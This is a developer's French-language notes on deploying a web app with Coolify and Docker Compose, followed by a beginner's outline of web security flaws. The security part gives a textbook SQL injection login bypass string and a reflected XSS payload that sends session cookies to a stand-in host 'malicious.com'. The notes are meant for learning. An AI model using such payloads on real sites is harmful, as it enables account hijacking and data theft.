# deploiement :

### historique des actions et pbm rencontrés

- lancement du deploiement sur coolify à partir du repo github publique
- **erreur :**
	- npm n'arrive pas à acceder aux package.json
	- connexion au server via ssh pour identifier le probleme
	- le dossier du projet n'est que partiellement importé de github
	- activation de l'option "Preserve Repository During Deployment" dans coolify
- deploiement à nouveau
- **erreur :**
	- conflits dans les fichiers importés
	- resolus manuellement avec ssh pour l'instant
- le deploiement va plus loin
- **erreur :**
	- imports ne fonctionnent pas à cause d'une erreur dans le nom d'un fichier icone
- resoud le pbm, push sur github, redeploi
- ca marche ! -> le site est en ligne, sur l'url generee par coolify
- **erreur :**
	- la ddb n'envoit pas ses infos
	- ddb ne trouve le dossier `pg_notify`
	- pbm vient du volume de la ddb "psql" qui n'est pas vide donc pas reinstallé
	- il faudra l'enlever de github, pour l'instant je le vide
- ca marche !
- **erreur :**
	- le site s'affiche, mais pas les infos de la ddb
	- les fetch sont fait sur http://localhost:3000 -> pas bon
	- pbm avec le nom de domaine : les variables .env ne sont pas remplies
	- pour que les variables soient prises en compte il faut rebuild react
- **erreur :**
	- npm run build ne marche pas
	- pbm vient de la ligne "main: index.js" : parcel ne sait pas quoi en faire, je l'enleve
	- build fonctionne, pbms de .env et url resolu momentanement
	- les fetch se font sur la bonne adresse au lieu de localhost
- **erreur :**
	- aucune info ne revient du back
	- les donnees n'ont pas ete seedées, je les seed manuellement
- **erreur :**
	- les fetch se font à nouveau sur localhost, peut-etre qu'en seedant les donnees j'ai perdu les variables d'env en relancant le container ? bizarre
	- je change les .env pour mettre toutes les variables d'env dans le compose file, et les donner à coolify
	- c'est bon les variables sont bien transmises aux containers
- **erreur :**
	- les appels fetch marchent une fois, puis passent à nouveau sur localhost, il faut inverstiguer
	- en fait les fichier dans dist automatiquement crées par react ne sont pas bien mis à jour à cause de leur presence dans github
	- je les enleve de git
- **erreur :**
	- on à perdu les donnees de la base de donnee, je vais automatiser leur seeding



### liste des problemes et de leur resolution

- resoudre les pbm que recontre coolify pour le deploiement :
	1. il commence par creer des dossier ./BACK/db/migration.sql/ et ./BACK/db/seeding.sql/ au lieu de fichiers, parce qu'il les voit dans le docker-compose.yml en tant que "bind mount files" et il croit que ce sont des volumes
	2. puis il ne parvient pas a les remplacer par les fichiers quand il synchronise avec github
	3. ensuite il n'arrive pas toujours a creer la base de donnee, parce qu'il a copié le dossier psql depuis github donc il saute l'etape de recreer la base de donnee, et il lui manque des choses
	4. à ce stade, le site s'affiche, mais pas toujours sur le meme port, c'est encore mysterieux
	5. ensuite il n'a pas les variables d'environnement pour les fetchs
	6. à un moment il y a le pbm de la base de donnee qui doit etre cree en 2 etapes en de-commentant des lignes, je ne sais pas encore comment resoudre ca
	7. et après il y a encore des problemes non-identifiés

#### pbm 1 et 2 :

- dans le docker-compose.yml, au lieu d'avoir 2 fichier "bind mount", on va mettre un volume qui contient les 2 fichiers :
	- avant :
	```
  volumes:
    - ./BACK/db/migration.sql:/docker-entrypoint-initdb.d/create_tables.sql 
    - ./BACK/db/seeding.sql:/docker-entrypoint-initdb.d/seeding.sql
	```
	- apres :
	```
  volumes:
    - ./BACK/db/:/docker-entrypoint-initdb.d/
	```
- aussi on change le nom de `migration.sql` pour `create_tables.sql` puisqu'il doit s'appeller comme ca dans le container
- ok

#### pbm 3 :

- on a tout simplement pas besoin de synchroniser le dossier psql dans github
	- donc on l'enleve de github : `git rm -r psql/`
	- et on le met dans .gitignore : `psql/`
- la base de donnee se recreer correctement si on deploi
- ok

#### pbm 4 : ?

#### pbm 5 :

- pour l'instant chaque dossier FRONT et BACK possede son fichier .env avec ses variables d'environnements
- mais coolify ne nous laisse pas creer des variables d'environnement localisées dans tel ou tel fichier (à ma connaissance)
- donc on va changer la structure du projet pour que toutes le variables d'environnement soient declarées dans le .env à la racine du projet :
	- on declare toutes la variables dans le .env à la racine du projet
	- dans le fichier docker-compose.yml on injecte les bonnes variables dans les bons containers :
		- avant :
		```
		# dans docker-compose :

		services:
			bdd:
				environment:
					POSTGRES_DB: "skillswap"

			front:
				# pas d'environnement
		```
		- apres :
		```
		# dans .env à la racine du projet :

		POSTGRES_DB=skillswap
		REACT_APP_URL=camille.cloud
		```
		```
		# dans docker-compose :

		services:
			bdd:
				environment:
					POSTGRES_DB: ${POSTGRES_DB}

			front:
				environment:
					REACT_APP_URL: ${REACT_APP_URL}
		```
- maintenant les variables d'environnements sont dans tout l'environnement de chaque container, au lieu d'etre dans un fichier
- il ne reste plus qu'à les rentrer dans coolify avant de deployer
- ok


# securité :

## types de failles de securité :

1. **injection SQL**
   injecter une requete sql "malveillante", qui fait fonctionner la base de donnee d'une maniere imprevue
	 ex de requete avec 2 champs de formulaire pour se connecter 'username' et 'password' :
	    "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
			si on remplis uniquement le 'username' avec [' OR '1'='1], ca donne cette requete :
			SELECT * FROM users WHERE username = '' OR '1'='1' AND password = '';
			1=1 est toujours vraie donc on peut se connecter avec n'importe username sans le mot de passe
2. **xss**
   injecter du code "malveillant" sur une page vue par un autre utilisateur, par exemple pour recuperer ses cookies de session
   ex d'attaque xss sur un site web qui permet de faire une recherche :
	    1. le site possede une page avec un champ de recherche, on peut chercher "babar" par exemple :
			   `recherche: [babar]`
			2. lorsqu'on valide la recherche, elle est envoyé avec la methode GET au back :
			   `https://exemple.com/search?query=babar`
			3. le site affiche ensuite la recherche en plus des resultats :
				 `les resultats pour votre recherche "babar" sont etc...`
			4. donc si on envoit cette url à quelqu'un, il va voir les resultats s'afficher :
			   `https://exemple.com/search?query=babar`
				 `les resultats pour votre recherche "babar" sont etc...`
			5. au lieu d'envoyer "babar" dans le champs de recherche, on peut y mettre un script :
			   [<script>document.location='http://malicious.com/steal?cookie='+document.cookie</script>]
				 les resultats pour votre recherche <script>...</script>
				 -> le script est executé
				 en l'occurence, il vole les cookies de session de la personne, on peut donc ensuite se connecter a son compte
3. **csrf**
   
4. **brute force**
   
5. **man in the middle**
   
6. **ddos**
   
7. **idor**
   
